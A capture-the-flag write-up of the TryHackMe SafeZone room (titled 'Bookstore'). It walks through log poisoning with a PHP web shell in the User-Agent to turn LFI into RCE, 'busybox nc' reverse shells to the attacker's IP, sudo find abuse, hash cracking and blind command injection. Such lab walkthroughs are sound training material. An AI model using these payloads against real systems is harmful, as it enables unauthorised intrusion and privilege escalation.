# Bookstore Writeup
*You can find the CTF on [Tryhackme](https://tryhackme.com/room/safezone)*

## Requirements
+ Always run your tools inside a virtual machine. Kali Linux (or similar) is a good starting point because it comes preloaded with many security tools, but **any Linux distro** in a VM is fine as long as you install what you need. Try not to use the Hackbox and setup your own env!
+ Before reading this writeup, please read the [README](../README.md), because what you are looking for might not be here.

## The Writeup

### User Flag

<details>
  <summary>Hint 1</summary>
Apache sometimes shares too much about its users. Have you tried looking into their home directories using the `~` symbol?

</details>
<details>
  <summary>Hint 2</summary>

If you can't upload a file, use the logs!
</details>
<details>
  <summary>Hint 3</summary>

If the application refuses to talk back to you (no output), try making it wait.
</details>

<details>
  <summary>Solution</summary>

As I like to do in every box, the first step is to avoid copying and pasting the IP address all the time by giving it a name.

```bash
    export TARGET="10.80.169.110"
```

Visiting our target's page, it looks like just a static website. Let's enumerate the website using gobuster.


```bash
    ┌──(kali㉿)-[~]
    └─$ gobuster dir -u $TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
    ===============================================================
    Gobuster v3.8
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.80.185.153
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.8
    [+] Extensions:              php,html,txt
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /index.html           (Status: 200) [Size: 503]
    /index.php            (Status: 200) [Size: 2372]
    /news.php             (Status: 302) [Size: 922] [--> index.php]
    /register.php         (Status: 200) [Size: 2334]
    /detail.php           (Status: 302) [Size: 1103] [--> index.php]
    /logout.php           (Status: 200) [Size: 54]
    /dashboard.php        (Status: 302) [Size: 922] [--> index.php]
    /note.txt             (Status: 200) [Size: 121]
    /server-status        (Status: 403) [Size: 278]
    Progress: 882232 / 882232 (100.00%)
    ===============================================================
    Finished
    ===============================================================
```

Let's start with `note.txt`; this looks like valuable information for later.

```
    Message from admin :-

            I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```

Most of the PHP files we found redirect to `/index.php`, which is a login page. I'll register first at `/register`.php with `root@gmal.com` and password `root`.

We are in! The only page that works is Details, and it has a hint hidden in the source code.

```html
<!-- try to use "page" as GET parameter-->
```

I tried to exploit the page parameter, but I didn't get any results. It seems like a dead end for the moment, but might be useful later.

I couldn't find any other useful hints, so I went back and researched online for common directory structures. I found that there is an Apache misconfiguration that sometimes lets you download files from a user folder. Since the previous hint mentioned a user called "files", I checked:

```
http://10.80.169.110/~files/
```

And it works! There is a `pass.txt` file we can download. 

```
    Admin password hint :-

            admin__admin

                    " __ means two numbers are there , this hint is enough I think :) "
```

We have new credentials, but we need to complete the password. After trying the canonical `admin00admin` and `admin69admin`, I decided to write a script. It also bypasses the 3-attempt limit by logging in with valid credentials every two attempts to avoid triggering a lockout. Now we can log in as admin, and the details page gives us an interesting endpoint where we can ID a user. Now the page parameter works for an `LFI` (Local File Inclusion).

To escalate this LFI to `RCE` (Remote Code Execution), we need to run malicious code. We can't upload or change any files directly, but we can poison the Apache access log located at `/var/log/apache2/access.log`.

This file logs all connections to the Apache server. If we poison our User-Agent, we can inject malicious PHP code, which runs when we display the file via the LFI.

So, let's fire up Burp Suite and change our User-Agent to:

```php
    <?php system($_GET['cmd']); ?>
```

Do this only once to avoid breaking the log file. If you mess up, you'll have to reboot the whole machine.

Now that our exploit is online, we can run our favorite [reverse shell](https://www.revshells.com/).
Remember to URL encode your payload, which should look like this:

```
http://10.80.169.110/detail.php?page=/var/log/apache2/access.log&cmd=busybox+nc+192.168.177.1+9001+-e+sh
```

And we are in as the user `www-data`! We need to pivot to the user files, and it looks pretty straightforward.

```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    www-data@safezone:/var/www/html$ sudo -l
    sudo -l
    Matching Defaults entries for www-data on safezone:
        env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
        XFILESEARCHPATH XUSERFILESEARCHPATH",
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
        mail_badpass

    User www-data may run the following commands on safezone:
        (files) NOPASSWD: /usr/bin/find
```

We can run find as files without a password. A quick look at [GTFOBins](https://gtfobins.github.io/gtfobins/find/#shell) gives us the solution; we just need to craft the payload.

```bash
    www-data@safezone:/var/www/html$ sudo -u files /usr/bin/find . -exec /bin/sh \; -quit
    <udo -u files /usr/bin/find . -exec /bin/sh \; -quit
    $ python3 -c 'import pty; pty.spawn("/bin/bash")'
    files@safezone:/var/www/html$
```
We are now files, but this isn't the flag owner yet. yash looks like the target user. We need another privilege escalation. Unfortunately, sudo -l isn't very useful this time since we can only run id and it doesn't have any known exploits here.


```bash
files@safezone:/home$ sudo -l
sudo -l
Matching Defaults entries for files on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User files may run the following commands on safezone:
    (yash) NOPASSWD: /usr/bin/id
files@safezone:/home$ sudo -u yash /usr/bin/id
sudo -u yash /usr/bin/id
uid=1000(yash) gid=1000(yash) groups=1000(yash),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),114(sambashare)
```

However, there is an interesting hidden file in the home directory.

```bash
    files@safezone:~$ ls -la
    ls -la
    total 40
    drwxrwxrwx 5 files files 4096 Mar 29  2021  .
    drwxr-xr-x 4 root  root  4096 Jan 29  2021  ..
    -rw------- 1 files files    0 Mar 29  2021  .bash_history
    -rw-r--r-- 1 files files  220 Jan 29  2021  .bash_logout
    -rw-r--r-- 1 files files 3771 Jan 29  2021  .bashrc
    drwx------ 2 files files 4096 Jan 29  2021  .cache
    drwx------ 3 files files 4096 Jan 29  2021  .gnupg
    drwxrwxr-x 3 files files 4096 Jan 30  2021  .local
    -rw-r--r-- 1 files files  807 Jan 29  2021  .profile
    -rw-r--r-- 1 root  root   105 Jan 29  2021 '.something#fake_can@be^here'
    -rwxrwxrwx 1 root  root   112 Jan 29  2021  pass.txt
    files@safezone:~$ cat .something#fake_can@be^here
    cat .something#fake_can@be^here
    files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```
It's probably the password for the user files. Let's crack it.

```bash
    ┌──(kali㉿)-[~]
    └─$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 16 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    magic            (?)
    1g 0:00:00:00 DONE (2025-12-13 13:09) 1.470g/s 6023p/s 6023c/s 6023C/s slimshady..oooooo
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed.
```

Let's log in via SSH as `files`. From the `id yash` command, we know he is in the sambashare group. Let's see if any internal services are running on the server.

```bash
    files@safezone:~$ ss -tulpn
    Netid    State      Recv-Q     Send-Q               Local Address:Port          Peer Address:Port
    udp      UNCONN     0          0                    127.0.0.53%lo:53                 0.0.0.0:*
    udp      UNCONN     0          0               10.80.169.110%ens5:68                 0.0.0.0:*
    tcp      LISTEN     0          128                      127.0.0.1:8000               0.0.0.0:*
    tcp      LISTEN     0          80                       127.0.0.1:3306               0.0.0.0:*
    tcp      LISTEN     0          128                  127.0.0.53%lo:53                 0.0.0.0:*
    tcp      LISTEN     0          128                        0.0.0.0:22                 0.0.0.0:*
    tcp      LISTEN     0          128                              *:80                       *:*
    tcp      LISTEN     0          128                           [::]:22                    [::]:*
```

Since I don't want to explore via text-based SSH, I'll use SSH to tunnel the service to my local machine.

```bash
    ┌──(kali㉿)-[~]
    └─$ ssh -L 8000:127.0.0.1:8000 files@10.80.169.110
    files@10.80.169.110's password:
    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-140-generic x86_64)
...
```
There isn't an index page, so we will use gobuster.

```bash
    ┌──(kali㉿)-[~]
    └─$ gobuster dir -u http://localhost:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,htm
    l,txt
    ===============================================================
    Gobuster v3.8
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://localhost:8000
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.8
    [+] Extensions:              php,html,txt
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /# license, visit http://creativecommons.org/licenses/by-sa/3.0/.html (Status: 403) [Size: 178]
    /login.html           (Status: 200) [Size: 462]
```

Another login page, another riddle! There is a login.js file with the credentials that we need!

```js
    var attempt = 3;
    function validate(){
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    if ( username == "user" && password == "pass"){
    alert ("Login successfully");
    window.location = "pentest.php";
    return false;
    }
    else{
    attempt --;
    alert("You have left "+attempt+" attempt;");
    // Disabling fields after 3 attempts.
    if( attempt == 0){
    document.getElementById("username").disabled = true;
    document.getElementById("password").disabled = true;
    document.getElementById("submit").disabled = true;
    return false;
    }
    }
    }
```

Now we need to exploit "Message for Yash". At first, it looks like just an echo of our message, but if you try to run commands like whoami or id, it doesn't work. In this case, I like to use blind command injection. I'll inject commands that require a measurable amount of time to execute. If the server takes longer than usual to respond, we know the code is running under the hood. Let's try:

```bash
    ping -c 100 localhost
```

The server hangs after sending the pings, confirming execution even though we see no output. Let's create a script as user files that generates a new file in the same folder, then see if the website triggers it.

```bash
    files@safezone:~$ echo "touch /home/files/exploit" > vector
    files@safezone:~$ chmod +x vector
```

![2](/SafeZone1/screenshots/2.png)


```bash
    files@safezone:~$ ls
    exploit  pass.txt  vector
```

We did it! Now we just need to build an actual reverse shell and run it.

```bash
    files@safezone:~$ echo "busybox nc 192.168.177.1 9001 -e sh" > vector
```

```bash
    Ncat: Listening on 0.0.0.0:9001
    Ncat: Connection from 10.80.169.110:57638.
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    yash@safezone:/opt$ cd /home/yash
    yash@safezone:~$ ls
    flag.txt
    yash@safezone:~$ cat flag.txt
```
</details>

### Privilage Escalation

<details>
  <summary>Hint 1</summary>

This backup script acts like a photocopier
</details>
<details>
  <summary>Hint 2</summary>

You don't need a second hint trust me! You just need to guess
</details>
<details>
  <summary>Hint 3</summary>

You didn't read the second hint?!
</details>

<details>
  <summary>Solution</summary>

Let's see what privileges we have with this new user:
```bash
    yash@safezone:~$ sudo -l
    Matching Defaults entries for yash on safezone:
        env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
        XFILESEARCHPATH XUSERFILESEARCHPATH",
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
        mail_badpass

    User yash may run the following commands on safezone:
        (root) NOPASSWD: /usr/bin/python3 /root/bk.py
```
It looks like we've found our path to root via this backup script! Let's give it a test run to understand its functionality:

```bash
    yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py
    sudo /usr/bin/python3 /root/bk.py
    Enter filename: /home/files/exploit
    /home/files/exploit
    Enter destination: /home/yash
    /home/yash
    Enter Password: root
    root
    yash@safezone:~$ ls
```

It essentially copies any file to a destination of our choice with root privileges. Instead of overcomplicating things, why don't we just try to copy the flag directly from the root directory? We just need to guess the filename, but root.txt is usually a safe bet. (Also, the password prompt seems to accept anything!)

```bash
    yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py
    sudo /usr/bin/python3 /root/bk.py
    Enter filename: /root/root.txt
    /root/root.txt
    Enter destination: /home/yash/
    /home/yash/
    Enter Password: LOL
    LOL
    yash@safezone:~$ cat root.txt
```

</details>


